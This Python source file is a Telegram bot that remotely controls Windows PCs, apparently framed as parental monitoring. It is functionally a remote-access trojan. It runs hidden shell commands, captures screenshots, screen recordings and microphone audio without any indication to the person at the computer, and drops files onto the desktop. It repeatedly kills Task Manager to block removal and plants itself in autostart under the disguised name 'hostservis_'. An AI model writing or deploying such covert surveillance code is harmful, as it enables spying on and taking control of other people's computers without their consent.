# -*- coding: utf-8 -*-
import telebot
import psutil
import subprocess
import os
import sys
import ctypes
import webbrowser
import datetime
import tempfile
import threading
import winreg
import tkinter as tk
import time
import json
from io import BytesIO
from PIL import ImageGrab, Image, ImageTk
from config import BOT_TOKEN, ALLOWED_USER_IDS, PROXY, PC_NAME

if PROXY:
    telebot.apihelper.proxy = {"https": PROXY, "http": PROXY}

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

current_device = None
current_play_volume = 1.0
_autokill_apps = set()
_autokill_thread = None
_autokill_running = False
_block_taskmgr = False
_recording = False
_record_thread = None

# ─── МУЛЬТИ-ПК: реестр онлайн-машин ─────────────────────────────────────────
# Структура: { chat_id: { "pc_name": str, "last_seen": timestamp, "ip": str } }
# Каждый ПК пишет себя в общий Telegram-чат через специальное служебное сообщение.
# Для хранения используем локальный файл — каждый экземпляр обновляет свою запись
# через бота (отправляет heartbeat в личку каждому ALLOWED_USER_IDS).

_HEARTBEAT_INTERVAL = 30  # секунд

# selected_pc[chat_id] = PC_NAME — какой ПК выбран для данного чата
# Хранится только в памяти текущего экземпляра (не нужно синхронизировать)
_selected_pc = {}  # chat_id -> pc_name (None = все)

# online_pcs[pc_name] = last_seen timestamp — обновляется через heartbeat-сообщения
_online_pcs = {}


# ─── ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ─────────────────────────────────────────────────

def run_hidden(cmd):
    subprocess.call(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def allowed(message):
    return message.from_user.id in ALLOWED_USER_IDS

def deny(message):
    bot.reply_to(message, "\U0001f6ab Нет доступа.")

def pc_tag():
    return "[{}] ".format(PC_NAME)

def is_for_me(message):
    """Проверяет, адресовано ли сообщение этому ПК.
    Логика: если пользователь выбрал конкретный ПК через /pcselect,
    то сообщения обрабатывает только он. Если выбран 'all' или не выбран — все.
    """
    chat_id = message.chat.id
    selected = _selected_pc.get(chat_id)
    if selected is None or selected == "all":
        return True
    return selected.lower() == PC_NAME.lower()

def main_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("\U0001f4f8 Скриншот", "\U0001f4cb Процессы")
    markup.row("\U0001f4bb Система", "\U0001f507 Звук выкл", "\U0001f508 Звук вкл")
    markup.row("\U0001f512 Заблокировать", "\U0001f504 Перезагрузить", "\u26d4 Выключить")
    markup.row("\U0001f50a Динамики", "\u2753 Помощь")
    return markup

# ─── HEARTBEAT: регистрация ПК ───────────────────────────────────────────────

def _heartbeat_worker():
    """Каждые N секунд отправляет служебное сообщение с меткой ПК."""
    while True:
        try:
            now = int(time.time())
            payload = "__HEARTBEAT__:{}:{}".format(PC_NAME, now)
            for uid in ALLOWED_USER_IDS:
                try:
                    bot.send_message(uid, payload)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(_HEARTBEAT_INTERVAL)

def _parse_heartbeat(text):
    """Возвращает (pc_name, timestamp) или None."""
    if text and text.startswith("__HEARTBEAT__:"):
        parts = text.split(":")
        if len(parts) == 3:
            try:
                return parts[1], int(parts[2])
            except ValueError:
                pass
    return None

# ─── МУЛЬТИ-ПК КОМАНДЫ ───────────────────────────────────────────────────────

@bot.message_handler(commands=["pclist"])
def pclist_cmd(message):
    if not allowed(message): return deny(message)
    now = int(time.time())
    # Добавляем себя
    _online_pcs[PC_NAME] = now
    if not _online_pcs:
        bot.reply_to(message, "Нет онлайн ПК.")
        return
    selected = _selected_pc.get(message.chat.id)
    lines = []
    for name, ts in sorted(_online_pcs.items()):
        ago = now - ts
        if ago < 60:
            status = "\U0001f7e2 онлайн"
        elif ago < 120:
            status = "\U0001f7e1 недавно"
        else:
            status = "\U0001f534 офлайн"
        mark = " \u2190 выбран" if name == selected else ""
        lines.append("{} {}{}".format(status, name, mark))
    bot.send_message(message.chat.id, "\U0001f5a5 ПК:\n" + "\n".join(lines))

@bot.message_handler(commands=["pcselect"])
def pcselect_cmd(message):
    if not allowed(message): return deny(message)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /pcselect <имя ПК> или /pcselect all\nТекущий: {}".format(
            _selected_pc.get(message.chat.id, "all (все)")))
        return
    name = parts[1].strip()
    _selected_pc[message.chat.id] = name
    # Каждый экземпляр получит это сообщение и обновит свой _selected_pc
    bot.reply_to(message, "\u2705 Активный ПК: {}".format(name))

@bot.message_handler(func=lambda m: _parse_heartbeat(m.text) is not None)
def handle_heartbeat(message):
    """Обрабатывает heartbeat от других ПК — обновляет реестр онлайн машин."""
    result = _parse_heartbeat(message.text)
    if result:
        name, ts = result
        _online_pcs[name] = ts
    # Удаляем служебное сообщение из чата чтобы не засорять
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception:
        pass


# ─── СТАРТ ───────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["start"])
def start(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    bot.send_message(message.chat.id, pc_tag() + "\U0001f44b Привет! Управляй ПК:", reply_markup=main_keyboard())

# ─── СКРИНШОТ ────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: "\U0001f4f8" in (m.text or ""))
def screenshot(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = BytesIO()
        img.save(buf, format="JPEG", quality=55)
        buf.seek(0)
        bot.send_photo(message.chat.id, buf, caption=pc_tag())
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

# ─── ПРОЦЕССЫ ────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: "\U0001f4cb" in (m.text or ""))
def processes(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    procs = []
    for p in psutil.process_iter(["pid", "name", "memory_info"]):
        try:
            mem = p.info["memory_info"].rss // (1024 * 1024)
            procs.append((p.info["name"], p.info["pid"], mem))
        except Exception:
            pass
    procs.sort(key=lambda x: x[2], reverse=True)
    lines = ["{} (PID {}) - {} MB".format(n, pid, m) for n, pid, m in procs[:20]]
    bot.send_message(message.chat.id, pc_tag() + "\n".join(lines) if lines else "Нет процессов")

# ─── СИСТЕМА ─────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: "\U0001f4bb" in (m.text or ""))
def sysinfo(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("C:\\")
    boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%d.%m.%Y %H:%M")
    bot.send_message(message.chat.id,
        pc_tag() + "CPU: {}%\nRAM: {}/{} MB ({}%)\nДиск C: {}/{} GB ({}%)\nЗагружен: {}".format(
            cpu,
            ram.used//(1024**2), ram.total//(1024**2), ram.percent,
            disk.used//(1024**3), disk.total//(1024**3), disk.percent,
            boot
        )
    )

# ─── ЗВУК ────────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: "\U0001f507" in (m.text or ""))
def mute(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    run_hidden('powershell -c "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"')
    bot.reply_to(message, pc_tag() + "\U0001f507 Звук выключен.")

@bot.message_handler(func=lambda m: "\U0001f508" in (m.text or ""))
def unmute(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    run_hidden('powershell -c "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"')
    bot.reply_to(message, pc_tag() + "\U0001f508 Звук включён.")

# ─── БЛОКИРОВКА / ПЕРЕЗАГРУЗКА / ВЫКЛЮЧЕНИЕ ──────────────────────────────────

@bot.message_handler(func=lambda m: "\U0001f512" in (m.text or ""))
def lock_pc(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    ctypes.windll.user32.LockWorkStation()
    bot.reply_to(message, pc_tag() + "\U0001f512 ПК заблокирован.")

@bot.message_handler(func=lambda m: "\U0001f504" in (m.text or ""))
def reboot(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    bot.reply_to(message, pc_tag() + "\U0001f504 Перезагружаю через 5 сек...")
    run_hidden("shutdown /r /t 5")

@bot.message_handler(func=lambda m: "\u26d4" in (m.text or "") and "Выключить" in (m.text or ""))
def shutdown(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    bot.reply_to(message, pc_tag() + "\u26d4 Выключаю через 5 сек...")
    run_hidden("shutdown /s /t 5")


# ─── ДИНАМИКИ ────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: "\U0001f50a" in (m.text or "") and "Динамики" in (m.text or ""))
def list_devices(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        import sounddevice as sd
        seen = {}
        for i, d in enumerate(sd.query_devices()):
            if d["max_output_channels"] > 0 and d["name"] not in seen:
                seen[d["name"]] = i
        lines = []
        for idx, (name, i) in enumerate(seen.items()):
            mark = " \u2190 активный" if current_device == i or (current_device is None and idx == 0) else ""
            lines.append("#{} {}{}".format(idx, name, mark))
        bot.send_message(message.chat.id, pc_tag() + "\U0001f50a Динамики:\n" + "\n".join(lines) if lines else "Не найдены")
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(commands=["device"])
def set_device(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    global current_device
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().lstrip("#").isdigit():
        bot.reply_to(message, "Использование: /device <номер>")
        return
    idx = int(parts[1].strip().lstrip("#"))
    try:
        import sounddevice as sd
        seen = {}
        for i, d in enumerate(sd.query_devices()):
            if d["max_output_channels"] > 0 and d["name"] not in seen:
                seen[d["name"]] = i
        names = list(seen.keys())
        if idx >= len(names):
            bot.reply_to(message, "Нет устройства #{}".format(idx))
            return
        current_device = seen[names[idx]]
        bot.reply_to(message, pc_tag() + "\U0001f50a Выбран: {}".format(names[idx]))
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(commands=["volume"])
def set_play_volume(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    global current_play_volume
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        bot.reply_to(message, "Использование: /volume <0-100>")
        return
    level = max(0, min(100, int(parts[1].strip())))
    current_play_volume = level / 100.0
    bot.reply_to(message, pc_tag() + "\U0001f50a Громкость: {}%".format(level))

# ─── KILL / RUN / OPEN / MSG ─────────────────────────────────────────────────

@bot.message_handler(commands=["kill"])
def kill_process(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /kill <имя или PID>")
        return
    target = parts[1].strip()
    killed = []
    for p in psutil.process_iter(["pid", "name"]):
        try:
            if p.info["name"].lower() == target.lower() or str(p.info["pid"]) == target:
                p.kill()
                killed.append(p.info["name"])
        except Exception:
            pass
    bot.reply_to(message, pc_tag() + ("Завершено: {}".format(", ".join(killed)) if killed else "Не найден: {}".format(target)))

@bot.message_handler(commands=["run"])
def run_app(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /run <команда> [*N]\nПример: /run notepad *5")
        return
    arg = parts[1]
    count = 1
    if " *" in arg:
        cmd_part, n_part = arg.rsplit(" *", 1)
        if n_part.strip().isdigit():
            count = int(n_part.strip())
            arg = cmd_part.strip()
    try:
        for _ in range(count):
            subprocess.Popen(arg, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.reply_to(message, pc_tag() + "Запущено {} раз: {}".format(count, arg))
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(commands=["open"])
def open_url(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /open <сайт>")
        return
    url = parts[1].strip()
    if not url.startswith("http"):
        url = "https://" + url
    webbrowser.open(url)
    bot.reply_to(message, pc_tag() + "Открыто: {}".format(url))

@bot.message_handler(commands=["msg"])
def send_msg(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /msg <текст>")
        return
    text = parts[1].strip()
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, "Сообщение от родителей", 0x00001040), daemon=True).start()
    bot.reply_to(message, pc_tag() + "\U0001f4e8 Сообщение отправлено.")


# ─── ОБОИ ────────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["wallpaper"])
def set_wallpaper(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    target = message.reply_to_message if message.reply_to_message else None
    if target and target.photo:
        file_info = bot.get_file(target.photo[-1].file_id)
        data = bot.download_file(file_info.file_path)
        tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
        tmp_path = tmp.name
        tmp.write(data)
        tmp.close()
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, tmp_path, 3)
        bot.reply_to(message, pc_tag() + "\U0001f5bc Обои установлены.")
    else:
        bot.reply_to(message, "Ответь на фото командой /wallpaper")

# ─── АВТОЗАГРУЗКА ────────────────────────────────────────────────────────────

@bot.message_handler(commands=["addstartup"])
def add_to_startup(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /addstartup <путь к файлу>")
        return
    path = parts[1].strip().strip('"')
    name = os.path.basename(path)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, '"{}"'.format(path))
        winreg.CloseKey(key)
        bot.reply_to(message, pc_tag() + "\u2705 {} добавлен в автозагрузку.".format(name))
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(commands=["removestartup"])
def remove_from_startup(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Использование: /removestartup <имя>")
        return
    name = parts[1].strip()
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        bot.reply_to(message, pc_tag() + "\u2705 {} убран из автозагрузки.".format(name))
    except FileNotFoundError:
        bot.reply_to(message, pc_tag() + "Не найдено: {}".format(name))
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(commands=["liststartup"])
def list_startup(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        lines = []
        i = 0
        while True:
            try:
                name, val, _ = winreg.EnumValue(key, i)
                lines.append("{}: {}".format(name, val))
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, pc_tag() + "\U0001f504 Автозагрузка:\n" + "\n".join(lines) if lines else pc_tag() + "Пусто")
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

# ─── АВТОЗАКРЫТИЕ ────────────────────────────────────────────────────────────

def _autokill_worker():
    global _autokill_running
    while _autokill_running:
        targets = set(_autokill_apps)
        if _block_taskmgr:
            targets.add("taskmgr.exe")
        for p in psutil.process_iter(["pid", "name"]):
            try:
                if p.info["name"].lower() in targets:
                    p.kill()
            except Exception:
                pass
        time.sleep(1)

def _ensure_autokill_thread():
    global _autokill_thread, _autokill_running
    if not _autokill_running:
        _autokill_running = True
        _autokill_thread = threading.Thread(target=_autokill_worker, daemon=True)
        _autokill_thread.start()

@bot.message_handler(commands=["autokill"])
def autokill_cmd(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, "Использование:\n/autokill add <процесс>\n/autokill remove <процесс>\n/autokill list")
        return
    action = parts[1].lower()
    if action == "list":
        apps = list(_autokill_apps)
        bot.reply_to(message, pc_tag() + ("Автозакрытие:\n" + "\n".join(apps) if apps else "Список пуст."))
        return
    if len(parts) < 3:
        bot.reply_to(message, "Укажи имя процесса.")
        return
    name = parts[2].strip().lower()
    if action == "add":
        _autokill_apps.add(name)
        _ensure_autokill_thread()
        bot.reply_to(message, pc_tag() + "\u2705 {} будет автоматически закрываться.".format(name))
    elif action == "remove":
        _autokill_apps.discard(name)
        bot.reply_to(message, pc_tag() + "\u2705 {} убран из автозакрытия.".format(name))
    else:
        bot.reply_to(message, "Неизвестное действие. Используй add/remove/list")

@bot.message_handler(commands=["blocktaskmgr"])
def block_taskmgr_cmd(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    global _block_taskmgr
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or parts[1].strip().lower() not in ("on", "off"):
        bot.reply_to(message, "Использование: /blocktaskmgr on | off")
        return
    _block_taskmgr = parts[1].strip().lower() == "on"
    if _block_taskmgr:
        _ensure_autokill_thread()
        bot.reply_to(message, pc_tag() + "\U0001f512 Диспетчер задач заблокирован.")
    else:
        bot.reply_to(message, pc_tag() + "\u2705 Диспетчер задач разблокирован.")


# ─── ФАЙЛЫ / ВИДЕО / ФОТО / АУДИО ────────────────────────────────────────────

@bot.message_handler(content_types=["document"])
def receive_document(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        doc = message.document
        name = doc.file_name or "file"
        ext = os.path.splitext(name)[1].lower()
        if ext in [".mp3", ".wav", ".ogg"]:
            file_info = bot.get_file(doc.file_id)
            data = bot.download_file(file_info.file_path)
            tmp = tempfile.NamedTemporaryFile(suffix=ext, delete=False)
            tmp_path = tmp.name
            tmp.write(data)
            tmp.close()
            bot.reply_to(message, pc_tag() + "\U0001f50a Воспроизвожу... {}%".format(int(current_play_volume * 100)))
            def _play(p=tmp_path):
                try:
                    import sounddevice as sd
                    import soundfile as sf
                    audio, sr = sf.read(p, dtype="float32")
                    sd.play(audio * current_play_volume, sr, device=current_device)
                    sd.wait()
                except Exception as e:
                    for uid in ALLOWED_USER_IDS:
                        try: bot.send_message(uid, pc_tag() + "Ошибка воспроизведения: {}".format(e))
                        except Exception: pass
                finally:
                    try: os.remove(p)
                    except Exception: pass
            threading.Thread(target=_play, daemon=True).start()
            return
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        save_path = os.path.join(desktop, name)
        file_info = bot.get_file(doc.file_id)
        data = bot.download_file(file_info.file_path)
        with open(save_path, "wb") as f:
            f.write(data)
        bot.reply_to(message, pc_tag() + "\U0001f4be Файл сохранён: {}".format(save_path))
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(content_types=["video"])
def receive_video(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        file_info = bot.get_file(message.video.file_id)
        data = bot.download_file(file_info.file_path)
        tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
        tmp_path = tmp.name
        tmp.write(data)
        tmp.close()
        bot.reply_to(message, pc_tag() + "\U0001f3a5 Воспроизвожу видео на экране...")
        def _show_video(p=tmp_path):
            try:
                import cv2
                cap = cv2.VideoCapture(p)
                fps = cap.get(cv2.CAP_PROP_FPS) or 25
                delay = int(1000 / fps)
                cv2.namedWindow("video", cv2.WND_PROP_FULLSCREEN)
                cv2.setWindowProperty("video", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
                while cap.isOpened():
                    ret, frame = cap.read()
                    if not ret: break
                    cv2.imshow("video", frame)
                    if cv2.waitKey(delay) & 0xFF == 27: break
                cap.release()
                cv2.destroyAllWindows()
            except Exception as e:
                for uid in ALLOWED_USER_IDS:
                    try: bot.send_message(uid, pc_tag() + "Ошибка видео: {}".format(e))
                    except Exception: pass
            finally:
                try: os.remove(p)
                except Exception: pass
        threading.Thread(target=_show_video, daemon=True).start()
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(content_types=["photo"])
def receive_photo(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        data = bot.download_file(file_info.file_path)
        tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
        tmp_path = tmp.name
        tmp.write(data)
        tmp.close()
        def _show():
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.configure(bg="black")
            root.focus_force()
            sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
            img = Image.open(tmp_path)
            img.thumbnail((sw, sh), Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            tk.Label(root, image=photo, bg="black").pack(expand=True)
            root.bind("<Key>", lambda e: root.destroy())
            root.bind("<Button-1>", lambda e: root.destroy())
            root.mainloop()
            try: os.remove(tmp_path)
            except Exception: pass
        threading.Thread(target=_show, daemon=True).start()
        bot.reply_to(message, pc_tag() + "\U0001f5bc Фото на экране.")
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))

@bot.message_handler(content_types=["voice", "audio"])
def receive_audio(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    try:
        if message.content_type == "voice":
            file_info = bot.get_file(message.voice.file_id)
            ext = ".ogg"
        else:
            file_info = bot.get_file(message.audio.file_id)
            ext = ".mp3"
        data = bot.download_file(file_info.file_path)
        tmp = tempfile.NamedTemporaryFile(suffix=ext, delete=False)
        tmp_path = tmp.name
        tmp.write(data)
        tmp.close()
        bot.reply_to(message, pc_tag() + "\U0001f50a Воспроизвожу... {}%".format(int(current_play_volume * 100)))
        def _play(p=tmp_path):
            try:
                import sounddevice as sd
                import soundfile as sf
                audio, sr = sf.read(p, dtype="float32")
                sd.play(audio * current_play_volume, sr, device=current_device)
                sd.wait()
            except Exception as e:
                for uid in ALLOWED_USER_IDS:
                    try: bot.send_message(uid, pc_tag() + "Ошибка: {}".format(e))
                    except Exception: pass
            finally:
                try: os.remove(p)
                except Exception: pass
        threading.Thread(target=_play, daemon=True).start()
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка: {}".format(e))


# ─── МИК / ЗАПИСЬ ЭКРАНА ─────────────────────────────────────────────────────

@bot.message_handler(commands=["mic"])
def record_mic(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    parts = message.text.split(maxsplit=1)
    seconds = 10
    if len(parts) == 2 and parts[1].strip().isdigit():
        seconds = max(1, min(120, int(parts[1].strip())))
    bot.reply_to(message, pc_tag() + "\U0001f3d9 Записываю {} сек...".format(seconds))
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write as wav_write
        samplerate = 44100
        rec = sd.rec(int(seconds * samplerate), samplerate=samplerate, channels=1, dtype="int16")
        sd.wait()
        tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
        tmp_path = tmp.name
        tmp.close()
        wav_write(tmp_path, samplerate, rec)
        with open(tmp_path, "rb") as f:
            bot.send_voice(message.chat.id, f)
        os.remove(tmp_path)
    except Exception as e:
        bot.reply_to(message, pc_tag() + "Ошибка записи: {}".format(e))

@bot.message_handler(commands=["record"])
def record_screen(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    global _recording, _record_thread
    parts = message.text.split(maxsplit=1)
    seconds = 15
    if len(parts) == 2 and parts[1].strip().isdigit():
        seconds = max(3, min(120, int(parts[1].strip())))
    if _recording:
        bot.reply_to(message, pc_tag() + "Запись уже идёт.")
        return
    bot.reply_to(message, pc_tag() + "\U0001f534 Записываю экран {} сек...".format(seconds))
    def _do_record():
        global _recording
        _recording = True
        try:
            import cv2
            import numpy as np
            from PIL import ImageGrab as IG
            tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
            tmp_path = tmp.name
            tmp.close()
            frame = np.array(IG.grab(all_screens=True))
            h, w = frame.shape[:2]
            scale = min(1.0, 1280 / w)
            out_w, out_h = int(w * scale) & ~1, int(h * scale) & ~1
            fps = 10
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            out = cv2.VideoWriter(tmp_path, fourcc, fps, (out_w, out_h))
            end = time.time() + seconds
            while time.time() < end:
                img = np.array(IG.grab(all_screens=True))
                img = cv2.resize(img, (out_w, out_h))
                out.write(cv2.cvtColor(img, cv2.COLOR_RGB2BGR))
            out.release()
            with open(tmp_path, "rb") as f:
                bot.send_video(message.chat.id, f, caption=pc_tag() + "\U0001f3a5 Запись экрана")
            os.remove(tmp_path)
        except Exception as e:
            for uid in ALLOWED_USER_IDS:
                try: bot.send_message(uid, pc_tag() + "Ошибка записи экрана: {}".format(e))
                except Exception: pass
        finally:
            _recording = False
    _record_thread = threading.Thread(target=_do_record, daemon=True)
    _record_thread.start()

# ─── ПОМОЩЬ ──────────────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: "\u2753" in (m.text or ""))
def help_cmd(message):
    if not allowed(message): return deny(message)
    if not is_for_me(message): return
    bot.send_message(message.chat.id,
        pc_tag() + "\U0001f5a5 Управление ПК\n"
        "/kill chrome.exe — закрыть программу\n"
        "/run notepad *3 — запустить 3 раза\n"
        "/open youtube.com — открыть сайт\n"
        "Кнопки: Заблокировать / Перезагрузить / Выключить\n"
        "\n"
        "\U0001f5a5 Мульти-ПК\n"
        "/pclist — список всех ПК онлайн\n"
        "/pcselect ИМЯ — выбрать активный ПК\n"
        "/pcselect all — команды всем ПК\n"
        "\n"
        "\U0001f504 Автозагрузка\n"
        "/addstartup C:\\app.exe — добавить в автозагрузку\n"
        "/removestartup app.exe — убрать\n"
        "/liststartup — список\n"
        "\n"
        "\U0001f6ab Автозакрытие\n"
        "/autokill add chrome.exe — автозакрывать\n"
        "/autokill remove chrome.exe — отключить\n"
        "/autokill list — список\n"
        "/blocktaskmgr on/off — блокировать диспетчер задач\n"
        "\n"
        "\U0001f5bc Экран и медиа\n"
        "Кнопка Скриншот — снимок экрана\n"
        "/record 20 — запись экрана 20 сек\n"
        "Отправь фото — откроется во весь экран\n"
        "Отправь видео — воспроизведётся во весь экран\n"
        "Ответь на фото /wallpaper — поставить обои\n"
        "/msg Текст — сообщение поверх всех окон\n"
        "\n"
        "\U0001f4be Файлы\n"
        "Отправь любой файл — сохранится на рабочий стол\n"
        "\n"
        "\U0001f50a Звук\n"
        "/volume 80 — громкость (0-100)\n"
        "/device 1 — выбрать динамик\n"
        "Отправь голосовое / mp3 / wav — воспроизведётся\n"
        "/mic 30 — запись с микрофона 30 сек\n"
        "\n"
        "\U0001f4bb Мониторинг\n"
        "Кнопки: Процессы / Система",
        reply_markup=main_keyboard()
    )

# ─── АВТОЗАПУСК И УВЕДОМЛЕНИЕ ────────────────────────────────────────────────

def setup_autostart():
    try:
        exe = sys.executable
        # Если запущен как .exe (PyInstaller)
        if getattr(sys, "frozen", False):
            command = '"{}"'.format(exe)
        else:
            python = exe.replace("python.exe", "pythonw.exe")
            if not os.path.exists(python):
                python = exe
            script = os.path.abspath(__file__)
            command = '"{}" "{}"'.format(python, script)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "hostservis_{}".format(PC_NAME), 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass

def send_startup_notification():
    now = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    ram = psutil.virtual_memory()
    text = pc_tag() + "\U0001f7e2 PC онлайн!\n\U0001f554 Время: {}\n\U0001f4be RAM: {}/{} MB\n\nВыбери ПК: /pcselect {}".format(
        now, ram.used//(1024**2), ram.total//(1024**2), PC_NAME
    )
    for uid in ALLOWED_USER_IDS:
        try: bot.send_message(uid, text)
        except Exception: pass

if __name__ == "__main__":
    setup_autostart()
    send_startup_notification()
    # Запускаем heartbeat в фоне
    threading.Thread(target=_heartbeat_worker, daemon=True).start()
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
